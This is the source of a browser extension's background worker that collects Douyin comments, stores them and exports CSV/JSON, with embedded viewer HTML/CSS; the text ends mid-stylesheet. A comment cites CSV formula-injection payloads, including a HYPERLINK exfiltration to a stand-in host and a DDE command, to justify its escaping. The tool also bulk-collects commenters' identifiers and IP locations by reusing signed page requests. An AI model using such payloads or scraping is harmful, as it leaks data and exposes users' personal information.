/**
 * background.js —— MV3 service worker
 *
 * 职责（刻意最小化）：
 *   1. 保存已采集的评论（按 videoId 分池，chrome.storage.local）
 *   2. 导出 CSV / JSON（复用 douyin-probe/background.js 已跑通的 Blob + downloads 方案）
 *   3. 清空
 *
 * 刻意不做的事：
 *   - 不发起任何网络请求（所有数据都来自页面自身的流量）
 *   - 不碰签名
 *
 * 存储结构：
 *   dts_videos  : { [videoId]: { videoId, title, total, count, hasMore, updatedAt, signedUrlAt } }
 *   dts_c_<vid> : { [cid]: comment }        ← 按视频分键，避免单键超过 storage 配额
 */

const KEY_VIDEOS = 'dts_videos';
const PREFIX_COMMENTS = 'dts_c_';
// 防御：单视频超过这个数就不再增长（正常量级远低于此）。
// v0.1.5 起二级回复也落进同一个池子（带 is_reply/parent_cid），故上限从 30000 提到 80000。
const MAX_COMMENTS_PER_VIDEO = 80000;

// ---------- 存储 ----------
//
// ⚠️ 所有「读 → 改 → 写」都必须串行（serial）：chrome.storage 没有事务，
// 两个在途的 dts-comments（二级回复 4 路并发 + 页面自己的 captured）若交错执行
// 「A 读 → B 读 → A 写 → B 写」，A 那一批会被 B 整桶覆盖掉；而 content.js 已经把
// 这些 cid 记进了 seen，之后再也不会重发 ⇒ 静默丢数据。清空也走同一条队列，
// 保证「清空之前排队的写」不会在清空之后才落地把数据写回来。

let storageChain = Promise.resolve();
/** 把一个存储变更排进全局串行队列；返回该变更自己的结果（失败不会卡住后面的变更） */
function serial(fn) {
  const p = storageChain.then(fn);
  storageChain = p.catch(() => {});
  return p;
}

// 评论桶的内存副本（只缓存最近写过的几个视频）：落库是整桶读写，桶到几万条时每次 get 都要
// 反序列化整个对象。SW 存活期间所有写都经过 serial，所以缓存就是权威值；SW 被回收后自然清空。
const BUCKET_CACHE_MAX = 3;
const bucketCache = new Map();   // videoId -> { [cid]: comment }

function cacheBucket(videoId, obj) {
  bucketCache.delete(videoId);
  bucketCache.set(videoId, obj);
  while (bucketCache.size > BUCKET_CACHE_MAX) bucketCache.delete(bucketCache.keys().next().value);
}

async function getVideos() {
  const o = await chrome.storage.local.get(KEY_VIDEOS);
  return o[KEY_VIDEOS] || {};
}

async function getComments(videoId) {
  const key = PREFIX_COMMENTS + videoId;
  const o = await chrome.storage.local.get(key);
  return o[key] || {};
}

/** 只能在 serial 里调用：合并一批评论进桶并写回，返回桶里的条数 */
async function writeComments(videoId, list) {
  const key = PREFIX_COMMENTS + videoId;
  const cur = bucketCache.get(videoId) || await getComments(videoId);
  for (const c of list) {
    if (c && c.cid) cur[c.cid] = c;
  }
  const cids = Object.keys(cur);
  if (cids.length > MAX_COMMENTS_PER_VIDEO) {
    // 超出上限时丢弃最早创建的（按 create_time 排序）
    cids.sort((a, b) => (cur[a].create_time || 0) - (cur[b].create_time || 0));
    for (const cid of cids.slice(0, cids.length - MAX_COMMENTS_PER_VIDEO)) delete cur[cid];
  }
  try {
    await chrome.storage.local.set({ [key]: cur });
  } catch (e) {
    bucketCache.delete(videoId);   // 写失败：内存副本已含未落盘的条目，作废它，下次从存储重读
    throw e;
  }
  cacheBucket(videoId, cur);
  return Object.keys(cur).length;
}

// 合批：同一视频排队期间到达的多批评论合成一次整桶写（整桶重写的代价跟批数成正比，
// 高并发补采时能把几十次写压成几次）。meta 用最后一批的（title/total/hasMore 都是「最新值」语义）。
const putBuffers = new Map();   // videoId -> { items, waiters, meta }

/**
 * 落库一批评论（并更新该视频的元数据），返回落库后的条数。
 * 评论与元数据在**同一个**串行任务里写，清空不会插在两者之间留下「有元数据没评论」的幽灵记录。
 */
function putComments(videoId, list, metaPatch) {
  return new Promise((resolve, reject) => {
    let b = putBuffers.get(videoId);
    const isNew = !b;
    if (isNew) { b = { items: [], waiters: [], meta: null }; putBuffers.set(videoId, b); }
    for (const c of list || []) b.items.push(c);
    if (metaPatch) b.meta = metaPatch;
    b.waiters.push({ resolve, reject });
    if (isNew) {
      serial(async () => {
        // 从这一刻起再来的批次进新的缓冲、排下一个任务
        if (putBuffers.get(videoId) === b) putBuffers.delete(videoId);
        const n = await writeComments(videoId, b.items);
        if (b.meta) await updateVideoMetaUnlocked(videoId, Object.assign({}, b.meta, { count: n }));
        return n;
      }).then(
        (n) => b.waiters.forEach((w) => w.resolve(n)),
        (e) => b.waiters.forEach((w) => w.reject(e))
      );
    }
  });
}

/** 只能在 serial 里调用 */
async function updateVideoMetaUnlocked(videoId, patch) {
  const videos = await getVideos();
  videos[videoId] = Object.assign({ videoId }, videos[videoId] || {}, patch, {
    updatedAt: new Date().toISOString()
  });
  await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
  return videos[videoId];
}

// ---------- v0.5.26：不再打开任何页面补标题 ----------
// v0.5.24 曾按需开后台标签页读 https://www.douyin.com/video/<id> 的 document.title 来补
// 「抖音精选电脑版」这类通用标题。客户 2026-10-20 追问「能不打开其他的浏览器就获得标题吗」，
// 实测：视频页 HTML 是空壳（无 title、RENDER_DATA 只有 app），老分享接口 status_code=11110，
// detail 接口无 a_bogus 时 403 —— 不开页面确实拿不到。
// 因此 v0.5.26 起不再开页面/标签页：标题抓不到的条目在浮层里显示「视频 <末 8 位>」，
// 下一行仍有「ID … · 采集 …」可区分（由 content.js 的 pickLabel/pickSubLabel 负责）。

/** 清空：videoId = 只清那一条；all = 全清。与落库共用串行队列。 */
function clearStorage(videoId, all) {
  return serial(async () => {
    if (videoId) {
      await chrome.storage.local.remove(PREFIX_COMMENTS + videoId);
      bucketCache.delete(videoId);
      const videos = await getVideos();
      delete videos[videoId];
      await chrome.storage.local.set({ [KEY_VIDEOS]: videos });
    } else if (all === true) {
      const everything = await chrome.storage.local.get(null);
      const keys = Object.keys(everything).filter((k) => k === KEY_VIDEOS || k.startsWith(PREFIX_COMMENTS));
      await chrome.storage.local.remove(keys);
      bucketCache.clear();
    }
  });
}

async function setBadge(n) {
  try {
    await chrome.action.setBadgeText({ text: n ? String(n) : '' });
    await chrome.action.setBadgeBackgroundColor({ color: '#2b6cb0' });
  } catch (e) { /* 忽略 */ }
}

// ---------- CSV ----------

/**
 * RFC4180 转义 + 公式注入防护。
 *
 * 转义：包含引号/逗号/换行时用双引号包裹，内部引号翻倍。
 *
 * ⚠️ 公式注入（CSV injection）必须单独防：评论文本**完全由别人控制**——任何能看到
 * 这条视频的人都能写。Excel / WPS 打开 CSV 时，单元格首字符是 `= + - @` 就会被
 * 当公式执行：
 *   · `=HYPERLINK("http://evil/?"&A1,"点我")` → 导出者一点就把数据带出去
 *   · `=cmd|'/c calc'!A0`（DDE）→ 甚至能拉起本机进程
 * 本工具的主用途恰好就是「导出 CSV 用 Excel 看」，命中率几乎是 100%，所以必须挡。
 *
 * 做法：首字符命中时前置一个单引号——Excel 视其为「文本」前缀且不显示在单元格里；
 * 其余 CSV 读者只会多看到一个 `'`，比执行公式安全得多。对**所有**列统一处理，
 * 不区分「文本列/数字列」：本表没有任何合法的负数字段，误伤面为零。
 */
function csvCell(v) {
  if (v === null || v === undefined) return '';
  let s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  if (/[",\r\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
  return s;
}

/** 数据清洗 */
/** 去表情、@某人、#话题，用于 text_clean 列 */
function cleanText(t) {
  if (!t) return '';
  return String(t)
    .replace(/\[[^\[\]]{1,12}\]/g, '')   // [捂脸] 这类表情占位
    .replace(/@[^\s@]{1,30}/g, '')        // @某人
    .replace(/#[^\s#]{1,40}/g, '')        // #话题
    .replace(/\s+/g, ' ')
    .trim();
}

// v0.5.27：CSV 第 2 行是中文列名解释（第 1 行英文键不变，机器/AI 解析口径不动）。
// 说明行首列以 "# " 开头，解析器看到 cid 以 "#" 开头就当说明行跳过。
// 插件侧 D:\dycopy\dsh-douyin-comments\collector.mjs 里有一份完全相同的标签表，两处必须一致。
const CSV_COL_LABELS = {
  cid: '评论ID',
  create_time: '发布时间戳(秒)',
  create_time_str: '发布时间(UTC)',
  text: '评论原文',
  text_clean: '文本(去表情话题)',
  text_len: '字数',
  digg_count: '点赞数',
  reply_comment_total: '该评论回复数',
  ip_label: 'IP属地',
  is_hot: '是否热评(1/0)',
  is_folded: '是否折叠(1/0)',
  level: '层级(1一级2二级)',
  stick_position: '置顶位(0非置顶)',
  user_nickname: '昵称',
  user_uid: '用户内部ID(不可搜)',
  is_reply: '是否二级回复(1/0)',
  parent_cid: '父评论ID',
  user_sec_uid: 'sec_uid(主页链接用)',
  user_unique_id: '抖音号(空则填数字短号)',
  video_id: '视频ID(多视频导出)'
};

/** 说明行：按 cols 顺序取中文标签，首列加 "# " 标记 */
function csvLabelRow(cols) {
  return cols
    .map(function (k, i) { return csvCell((i === 0 ? '# ' : '') + (CSV_COL_LABELS[k] || k)); })
    .join(',');
}

function toCsv(comments, opts) {
  // 前 15 列是 v0.1.4 起就有的稳定契约（顺序/含义不变）；
  // v0.1.5 新增的二级回复在**末尾追加**两列，老读者按位置读前 15 列仍然正确。
  // v0.2.9 的「全部视频」导出再往末尾追加 video_id 一列（不带 withVideoId 时列数不变）。
  // v0.5.17 追加 user_sec_uid / user_unique_id：user_uid 只是抖音内部数字 ID，不是一个能搜的
  // 「抖音号」；unique_id 才是账号页上的抖音号（用户没设时为空），
  // sec_uid 用来拼主页 https://www.douyin.com/user/<sec_uid>。
  // v0.5.28：按客户要求删掉 user_short_id（抖音内部的短号，客户用不到；unique_id 为空时也没必要兜底）。
  // JSON / AI 返回里的 user.short_id 不动（那是抖音原始字段）。
  // v0.5.29：按客户要求加回兜底——`user_unique_id` 为空时改填数字短号（不新增列，标签改成「抖音号(空则填数字短号)」）。
  const withVideoId = !!(opts && opts.withVideoId);
  const cols = [
    'cid', 'create_time', 'create_time_str', 'text', 'text_clean', 'text_len',
    'digg_count', 'reply_comment_total', 'ip_label', 'is_hot', 'is_folded',
    'level', 'stick_position', 'user_nickname', 'user_uid',
    'is_reply', 'parent_cid',
    'user_sec_uid', 'user_unique_id'
  ];
  if (withVideoId) cols.push('video_id');
  const rows = [cols.join(','), csvLabelRow(cols)];
  for (const c of comments) {
    const t = c.text || '';
    const tc = cleanText(t);
    const ct = c.create_time ? new Date(c.create_time * 1000).toISOString() : '';
    const u = c.user || {};
    rows.push([
      csvCell(c.cid), csvCell(c.create_time), csvCell(ct), csvCell(t), csvCell(tc),
      csvCell([...String(t)].length),
      csvCell(c.digg_count), csvCell(c.reply_comment_total), csvCell(c.ip_label),
      csvCell(c.is_hot), csvCell(c.is_folded), csvCell(c.level), csvCell(c.stick_position),
      csvCell(u.nickname), csvCell(u.uid),
      // 二级回复两列：顶层评论为 0 / 空
      csvCell(c.is_reply ? 1 : 0), csvCell(c.parent_cid),
      csvCell(u.sec_uid), csvCell(u.unique_id || u.short_id)
    ].concat(withVideoId ? [csvCell(c.videoId || c.video_id || '')] : []).join(','));
  }
  return rows.join('\r\n');
}

/** 把字节数组编成 data URL。分块是为了避免 String.fromCharCode.apply 参数过多爆栈 */
function toDataUrl(bytes, mime) {
  const CHUNK = 0x8000; // 防止 apply 参数过多爆栈
  let s = '';
  for (let i = 0; i < bytes.length; i += CHUNK) {
    s += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
  }
  return 'data:' + mime + ';base64,' + btoa(s);
}

// false = 不弹窗，直接落到浏览器的下载目录（文件名仍带 videoId 与时间戳）
// true  = 每次导出弹原生「另存为」，让用户自己选位置
const SAVE_AS = false;

/** 等某个下载项进入终态（complete / interrupted）。
 *  chrome.downloads.download() 的 promise 在「下载项被创建」时就 resolve ——
 *  那时用户还没在「另存为」对话框里点确定。不等终态就报成功，
 *  用户点「取消」时面板会撒谎说「已导出」。（实测见 probe-saveas.mjs） */
function waitDownload(id, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (v) => {
      if (done) return;
      done = true;
      try { chrome.downloads.onChanged.removeListener(onChanged); } catch (e) {}
      clearTimeout(timer);
      resolve(v);
    };
    const onChanged = (delta) => {
      if (delta.id !== id || !delta.state) return;
      const cur = delta.state.current;
      // 注意：下载【开始】时也会上报一次 state='in_progress'，那不是终态。
      // 只有 complete / interrupted 才算结束。
      if (cur !== 'complete' && cur !== 'interrupted') return;
      // 终态时再查一次，拿权威的 state/error（error 有时在同一条事件里，有时不是）
      chrome.downloads.search({ id }, (items) => {
        const it = items && items[0];
        finish({ state: (it && it.state) || cur, error: (it && it.error) || (delta.error ? delta.error.current : '') });
      });
    };
    chrome.downloads.onChanged.addListener(onChanged);
    const timer = setTimeout(() => finish({ state: 'timeout', error: '' }), timeoutMs);
    // 兜底：可能在本监听注册之前就已经结束了（极小的下载会瞬间完成）
    chrome.downloads.search({ id }, (items) => {
      const it = items && items[0];
      if (it && it.state && it.state !== 'in_progress') {
        finish({ state: it.state, error: it.error || '' });
      }
    });
  });
}

async function download(text, filename, mime) {
  // MV3 service worker 没有 Blob URL 能力（不提供对象 URL），
  // 所以统一走 data URL —— chrome.downloads.download 对 data URL 支持良好。
  // 用 base64 而不是 encodeURIComponent：中文 CSV 走 %XX 会膨胀 3 倍，base64 只膨胀 4/3。
  const wantBom = /csv/i.test(mime);
  const bytes = new TextEncoder().encode(wantBom ? '\ufeff' + text : text);
  let id;
  try {
    id = await chrome.downloads.download({ url: toDataUrl(bytes, mime), filename, saveAs: SAVE_AS });
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
  if (id === undefined) return { ok: false, error: '下载未创建' };

  // 有未完成的下载项 + 挂起的消息端口，MV3 不会在用户挑保存位置时把 SW 杀掉。
  const final = await waitDownload(id, 5 * 60 * 1000);
  if (final.state === 'complete') {
    let path = null;
    try {
      const items = await chrome.downloads.search({ id });
      if (items && items[0] && items[0].filename) path = items[0].filename;
    } catch (e) { /* path 可选 */ }
    return { ok: true, filename, bytes: bytes.length, downloadId: id, path };
  }
  if (final.error === 'USER_CANCELED') return { ok: false, cancelled: true, error: '用户取消了保存' };
  if (final.state === 'timeout') return { ok: false, error: '下载超时未完成（可能对话框一直没关）' };
  return { ok: false, error: '下载中断：' + (final.error || final.state) };
}

// 导出实现（面板 dts-export 与 Hub(AI/MCP) 命令 export 共用一份，v0.5.9 起）：
//   scope=video（默认）：只导 opts.videoId 这一个桶；
//   scope=all（opts.all === true）：把本地所有视频的评论合成一份，每条评论标上 videoId，
//     CSV 末尾追加 video_id 列（前 17 列契约不变），JSON 里给 per-video 摘要。
//   scope=selected（opts.videoIds = [...]，v0.5.20 面板「自选视频…」）：只合选中的那几条；
//     选 1 条 = 与单视频导出同列数，选多条才追加 video_id 列。
//   优先级：all > videoIds > videoId。
// 失败口径统一：既没 videoId 又没 all → MISSING_VIDEO_ID；本地确实没数据 → EMPTY_POOL
// （不再下载一个只有表头的空文件，否则「导出成功」会掩盖「本来就是空的」）。
const EXPORT_NOTE = '由「抖音评论采集器」采集：数据来自抖音页面自身的接口响应。未破解或伪造签名、未绕过登录；开始采集前若还没有可用签名，扩展会用一次合成点击替你打开评论区（让页面自己发出请求），不滚动页面、不改动评论内容。二级回复通过复用页面自己已发出的签名 URL 拉取（仅改写 path 与 item_id/comment_id/cut_version/cursor/count）。';

async function exportComments(opts) {
  const o = opts || {};
  const wantAll = o.all === true;
  const videoId = o.videoId ? String(o.videoId) : '';
  const format = o.format === 'json' ? 'json' : 'csv';
  // v0.5.20：自选视频（面板「自选视频…」）。videoIds = 要导的那几条；优先级高于 all。
  const pickIds = Array.isArray(o.videoIds)
    ? Array.from(new Set(o.videoIds.map((x) => String(x || '').trim()).filter(Boolean)))
    : [];
  const wantPick = !wantAll && pickIds.length > 0;
  if (!wantAll && !wantPick && !videoId) {
    return { ok: false, error: 'MISSING_VIDEO_ID', hint: 'export 需要 videoId 参数；要导出本地全部视频请传 all:true；要导指定几条请传 videoIds:[...]' };
  }
  const allVideos = await getVideos();
  const perVideo = [];
  let comments = [];
  // 多条视频合成一份时才需要 video_id 列（单条保持既有列数契约）
  const multi = wantAll || (wantPick && pickIds.length > 1);

  if (wantAll) {
    const ids = Object.keys(allVideos);
    if (videoId && ids.indexOf(videoId) < 0) ids.push(videoId);   // 桶在、但 dts_videos 没记录
    for (const v of ids) {
      const list = Object.values(await getComments(v));
      if (!list.length) continue;
      perVideo.push({ videoId: v, title: (allVideos[v] && allVideos[v].title) || '', count: list.length });
      for (const c of list) comments.push(Object.assign({}, c, { videoId: v }));
    }
    if (!comments.length) {
      return { ok: false, error: 'EMPTY_POOL', scope: 'all', hint: '本地还没有任何评论数据：先采集，或用 list_videos / get_comments 确认' };
    }
  } else if (wantPick) {
    for (const v of pickIds) {
      const list = Object.values(await getComments(v));
      if (!list.length) continue;
      perVideo.push({ videoId: v, title: (allVideos[v] && allVideos[v].title) || '', count: list.length });
      for (const c of list) comments.push(Object.assign({}, c, { videoId: v }));
    }
    if (!comments.length) {
      return {
        ok: false, error: 'EMPTY_POOL', scope: 'selected', videoIds: pickIds,
        hint: '选中的视频本地都没有评论数据：先采集，或重新「自选视频」换个选择'
      };
    }
  } else {
    comments = Object.values(await getComments(videoId));
    if (!comments.length) {
      return { ok: false, error: 'EMPTY_POOL', videoId, hint: '该 videoId 本地没有评论数据' };
    }
  }
  // 按时间升序，便于阅读
  comments.sort((a, b) => (a.create_time || 0) - (b.create_time || 0));
  const meta = allVideos[videoId] || {};
  const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const replyCount = comments.filter((c) => c && c.is_reply).length;
  // 文件名：all / selected<N>（自选多条）/ 单条 videoId（自选 1 条时用它自己的 id）
  const fileTag = wantAll ? 'all' : (wantPick ? (multi ? 'selected' + pickIds.length : pickIds[0]) : videoId);
  const scopeTag = wantAll ? 'all' : (wantPick ? (multi ? 'selected' : 'video') : 'video');
  const singleVideoId = wantAll ? null : (wantPick ? (multi ? null : pickIds[0]) : videoId);
  let dl;
  // v0.5.32：JSON 也带上清洗后的文本（与 CSV 的 text_clean 列同口径），
  // 词云/分析台直接用它分词，不必再各自剥 [表情]。
  const jsonComments = comments.map((c) => Object.assign({}, c, { text_clean: cleanText(c && c.text) }));
  if (format === 'json') {
    const payload = Object.assign({
      exportedAt: new Date().toISOString(),
      scope: scopeTag,
      ...(multi
        ? { videos: perVideo }
        : { videoId: singleVideoId, title: (allVideos[singleVideoId] || {}).title, totalReported: (allVideos[singleVideoId] || {}).total })
    }, {
      count: comments.length,
      topLevelCount: comments.length - replyCount,
      videoCount: multi ? perVideo.length : 1,
      replyCount,   // v0.1.5：二级回复条数（带 parent_cid 的那些）
      note: EXPORT_NOTE,
      comments: jsonComments
    });
    dl = await download(JSON.stringify(payload, null, 2),
      `douyin-comments-${fileTag}-${stamp}.json`, 'application/json');
  } else {
    dl = await download(toCsv(comments, { withVideoId: multi }),
      `douyin-comments-${fileTag}-${stamp}.csv`, 'text/csv;charset=utf-8');
  }
  return Object.assign({
    scope: scopeTag,
    videoId: singleVideoId,
    videoIds: multi && !wantAll ? pickIds : null,
    videoCount: multi ? perVideo.length : 1,
    count: comments.length,
    topLevelCount: comments.length - replyCount,
    replyCount,
    format
  }, dl);
}

/* === BEGIN VIEWER ASSETS (generated by devkit/_gen_viewer_assets.mjs; 勿手改) === */
// 这三个字符串是「导出词云」用的自包含快照素材：词云页源码原样内嵌，
// 生成快照时替换 <link> 与 <script src> 两个标签即可变成单文件 HTML。
// 由 devkit/_gen_viewer_assets.mjs 生成；改词云页后要重新跑一次。
const VIEWER_ASSETS = {
  html: "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>评论分析台 · 词云 + 评论表</title>\n<link rel=\"stylesheet\" href=\"styles.css\">\n</head>\n<body class=\"is-empty\">\n<header class=\"topbar\">\n  <div class=\"brand\">\n    <svg class=\"mark\" viewBox=\"0 0 32 32\" fill=\"none\" aria-hidden=\"true\">\n      <path d=\"M5 8.5A3.5 3.5 0 0 1 8.5 5h15A3.5 3.5 0 0 1 27 8.5v10a3.5 3.5 0 0 1-3.5 3.5H14l-6.2 4.6A1 1 0 0 1 6.2 25.8V22H8.5A3.5 3.5 0 0 1 5 18.5v-10Z\" stroke=\"currentColor\" stroke-width=\"1.6\" stroke-linejoin=\"round\"/>\n      <circle cx=\"11\" cy=\"13.5\" r=\"1.4\" fill=\"currentColor\"/>\n      <circle cx=\"16\" cy=\"13.5\" r=\"1.4\" fill=\"currentColor\"/>\n      <circle cx=\"21\" cy=\"13.5\" r=\"1.4\" fill=\"currentColor\"/>\n    </svg>\n    <div class=\"shell-id\">\n      <h1>评论分析台</h1>\n      <p class=\"scope\" id=\"sourceInfo\">未载入数据</p>\n    </div>\n  </div>\n  <div class=\"actions\">\n    <button id=\"btnOpenFiles\" class=\"btn primary\" type=\"button\">打开导出文件…</button>\n    <button id=\"btnOpenDir\" class=\"btn\" type=\"button\">打开导出目录…</button>\n    <button id=\"btnClear\" class=\"btn ghost\" type=\"button\" disabled>清空</button>\n  </div>\n  <input type=\"file\" id=\"fileInput\" accept=\".json,.csv,application/json,text/csv\" multiple hidden>\n  <input type=\"file\" id=\"dirInput\" webkitdirectory directory multiple hidden>\n</header>\n\n<section id=\"kpis\" class=\"kpis\" aria-label=\"总览\"></section>\n\n<main class=\"grid\">\n  <section class=\"panel cloud-panel\">\n    <div class=\"panel-head\">\n      <div class=\"panel-title\">\n        <h2>词云</h2>\n        <span id=\"cloudSub\" class=\"panel-sub\"></span>\n      </div>\n      <div class=\"inline\">\n        <label class=\"meta\" for=\"cloudSize\">词数</label>\n        <select id=\"cloudSize\" class=\"select small\">\n          <option value=\"80\">80</option>\n          <option value=\"120\" selected>120</option>\n          <option value=\"160\">160</option>\n          <option value=\"220\">220</option>\n        </select>\n        <button id=\"btnRelayout\" class=\"btn small ghost\" type=\"button\">重新排布</button>\n      </div>\n    </div>\n    <div id=\"cloud\" class=\"cloud\" aria-label=\"评论关键词词云\"></div>\n    <div id=\"skCloud\" class=\"sk-cloud\" aria-hidden=\"true\" hidden></div>\n    <div id=\"skCloud\" class=\"sk-cloud\" aria-hidden=\"true\" hidden></div>\n    <div id=\"cloudEmpty\" class=\"empty\">\n      <svg class=\"empty-mark\" width=\"34\" height=\"34\" viewBox=\"0 0 32 32\" fill=\"none\" aria-hidden=\"true\">\n        <path d=\"M5 8.5A3.5 3.5 0 0 1 8.5 5h15A3.5 3.5 0 0 1 27 8.5v10a3.5 3.5 0 0 1-3.5 3.5H14l-6.2 4.6A1 1 0 0 1 6.2 25.8V22H8.5A3.5 3.5 0 0 1 5 18.5v-10Z\" stroke=\"currentColor\" stroke-width=\"1.6\" stroke-linejoin=\"round\"/>\n      </svg>\n      <strong>还没有数据</strong>\n      <p>载入插件或扩展导出的 <code>douyin-comments-*.json</code> / <code>.csv</code>，<br>也可以直接选整个导出目录，一次载入多条视频。</p>\n      <p class=\"meta\">数据只在本机浏览器里处理，不上传任何服务器。</p>\n      <button id=\"btnOpenFiles2\" class=\"btn primary\" type=\"button\">打开导出文件…</button>\n    </div>\n    <div class=\"cloud-foot\">\n      <span><span class=\"swatch\"></span>高频词 <span class=\"swatch grey\" style=\"margin-left:12px\"></span>一般 <span class=\"swatch mono\" style=\"margin-left:12px\"></span>低频 · 字号 = 出现次数</span>\n      <span>悬停看样例评论 · 点词看全部</span>\n    </div>\n  </section>\n\n  <aside class=\"panel side\">\n    <div class=\"panel-head\">\n      <div class=\"panel-title\">\n        <h2>关键词</h2>\n        <span id=\"wordInfo\" class=\"panel-sub\"></span>\n      </div>\n    </div>\n    <ol id=\"wordList\" class=\"word-list\"></ol>\n    <div class=\"panel-head sub\">\n      <h2>筛选</h2>\n    </div>\n    <div class=\"side-body\">\n      <label class=\"field\">\n        <span>视频</span>\n        <select id=\"videoFilter\" class=\"select\"></select>\n      </label>\n      <button id=\"btnOpenVideo\" class=\"btn small\" type=\"button\" disabled title=\"在新标签页打开当前选中视频的抖音页面\">打开原视频 ↗</button>\n      <label class=\"check\"><input type=\"checkbox\" id=\"onlyHasProfile\"> 只看有主页的用户</label>\n      <label class=\"check\"><input type=\"checkbox\" id=\"onlyTopLevel\"> 只看一级评论</label>\n      <label class=\"check\"><input type=\"checkbox\" id=\"onlyNonEmpty\"> 只看有文字的评论</label>\n    </div>\n  </aside>\n</main>\n\n<section class=\"panel table-panel\">\n  <div class=\"panel-head\">\n    <div class=\"panel-title\">\n      <h2>评论表</h2>\n      <span id=\"tableCount\" class=\"panel-sub\"></span>\n    </div>\n    <div class=\"inline\">\n      <input id=\"search\" class=\"input\" type=\"search\" placeholder=\"搜索评论内容 / 昵称 / 抖音号…\" autocomplete=\"off\">\n      <select id=\"sortBy\" class=\"select\">\n        <option value=\"digg\">按点赞降序</option>\n        <option value=\"time\">按时间降序</option>\n        <option value=\"len\">按字数降序</option>\n        <option value=\"replies\">按回复数降序</option>\n      </select>\n      <button id=\"btnExport\" class=\"btn small\" type=\"button\" disabled>导出筛选结果</button>\n    </div>\n  </div>\n  <div class=\"table-wrap\">\n    <table id=\"table\">\n      <thead>\n        <tr>\n          <th class=\"col-text\">评论内容</th>\n          <th class=\"col-user\">用户</th>\n          <th class=\"col-num\">点赞</th>\n          <th class=\"col-num\">回复</th>\n          <th class=\"col-ip\">属地</th>\n          <th class=\"col-time\">时间</th>\n          <th class=\"col-level\">层级</th>\n        </tr>\n      </thead>\n      <tbody id=\"tbody\"></tbody>\n    </table>\n    <div id=\"tableEmpty\" class=\"empty small\">没有符合条件的评论</div>\n    <div id=\"skTable\" class=\"sk-table\" aria-hidden=\"true\" hidden></div>\n    <div id=\"skTable\" class=\"sk-table\" aria-hidden=\"true\" hidden></div>\n  </div>\n  <nav id=\"pager\" class=\"pager\"></nav>\n</section>\n\n<footer class=\"foot\">\n  <span>本地静态页面 · 数据不上传</span>\n  <span>点昵称跳抖音主页（需导出数据带 sec_uid）</span>\n</footer>\n\n<div id=\"tooltip\" class=\"tooltip hidden\" role=\"tooltip\"></div>\n\n<aside id=\"drawer\" class=\"drawer hidden\" aria-label=\"关键词评论列表\">\n  <div class=\"drawer-head\">\n    <div>\n      <h3 id=\"drawerTitle\">关键词</h3>\n      <p id=\"drawerSub\" class=\"meta\"></p>\n    </div>\n    <button id=\"btnCloseDrawer\" class=\"btn ghost small\" type=\"button\">关闭</button>\n  </div>\n  <div id=\"drawerBody\" class=\"drawer-body\"></div>\n  <div class=\"drawer-foot\">\n    <button id=\"btnDrawerMore\" class=\"btn small\" type=\"button\">加载更多</button>\n    <button id=\"btnDrawerFilter\" class=\"btn small\" type=\"button\">在评论表里筛选这个词</button>\n  </div>\n</aside>\n\n<div id=\"toast\" class=\"toast hidden\"></div>\n\n<script src=\"app.js\"></script>\n</body>\n</html>\n", // 词云页 index.html
  css: "/* 评论分析台 · 样式\n   v2 视觉：单一强调色只落在数据上；中性纯净深色底；1px 线分隔；无渐变、无玻璃、无发光。\n   参考 tasteskill（app-screens）：KPI 一大格用线切分、数字右对齐等宽、面板无阴影、标题 20px。 */\n\n:root {\n  --bg: #0b0b0c;\n  --surface: #131315;\n  --surface-2: #1a1a1d;\n  --line: #27272b;\n  --line-strong: #3a3a40;\n  --ink: #f4f4f5;\n  --text: #d3d3d6;\n  --muted: #a3a3a8;\n  --meta: #8e8e94;\n  --accent: #e0a94a;\n  --accent-ink: #1a1206;\n  --accent-dim: #2a2213;\n  --pos: #6cc59a;\n  --neg: #e08a84;\n  --r: 8px;\n  --r-ctl: 6px;\n  --shadow-float: 0 18px 44px rgba(0, 0, 0, .55);\n  --font: \"Segoe UI\", Inter, \"Microsoft YaHei UI\", \"Microsoft YaHei\", \"PingFang SC\", system-ui, -apple-system, sans-serif;\n  --mono: \"Cascadia Mono\", Consolas, ui-monospace, SFMono-Regular, Menlo, monospace;\n}\n\n* { box-sizing: border-box; }\nhtml, body { margin: 0; padding: 0; }\nbody {\n  background: var(--bg);\n  color: var(--text);\n  font: 14px/1.5 var(--font);\n  font-variant-numeric: tabular-nums;\n  min-height: 100vh;\n  padding-bottom: 32px;\n  -webkit-font-smoothing: antialiased;\n}\n\n/* ---------- 控件 ---------- */\n.btn {\n  appearance: none;\n  border: 1px solid var(--line-strong);\n  background: transparent;\n  color: var(--text);\n  padding: 7px 13px;\n  border-radius: var(--r-ctl);\n  font: 500 13px/1.25 var(--font);\n  cursor: pointer;\n  white-space: nowrap;\n  transition: border-color .15s, background .15s, color .15s;\n}\n.btn:hover { border-color: #55555c; color: var(--ink); background: #17171a; }\n.btn:active { transform: translateY(1px); }\n.btn:disabled { opacity: .4; cursor: not-allowed; }\n.btn:focus-visible, .select:focus-visible, .input:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }\n/* 主操作：反白，不用强调色 */\n.btn.primary { background: var(--ink); border-color: var(--ink); color: #111113; font-weight: 600; }\n.btn.primary:hover { background: #fff; border-color: #fff; color: #000; }\n.btn.ghost { border-color: transparent; color: var(--muted); }\n.btn.ghost:hover { color: var(--ink); background: var(--surface-2); border-color: transparent; }\n.btn.small { padding: 5px 10px; font-size: 13px; }\n\n.select, .input {\n  appearance: none;\n  background: var(--surface-2);\n  color: var(--text);\n  border: 1px solid var(--line);\n  border-radius: var(--r-ctl);\n  padding: 6px 10px;\n  font: 13px/1.3 var(--font);\n  min-width: 130px;\n}\n.select { background-image: linear-gradient(45deg, transparent 50%, var(--meta) 50%), linear-gradient(135deg, var(--meta) 50%, transparent 50%); background-position: calc(100% - 15px) 52%, calc(100% - 10px) 52%; background-size: 5px 5px, 5px 5px; background-repeat: no-repeat; padding-right: 28px; }\n.select.small { min-width: 66px; padding: 4px 24px 4px 8px; font-size: 13px; }\n.input { min-width: 280px; }\n.input::placeholder { color: #7c7c82; }\n.select:hover, 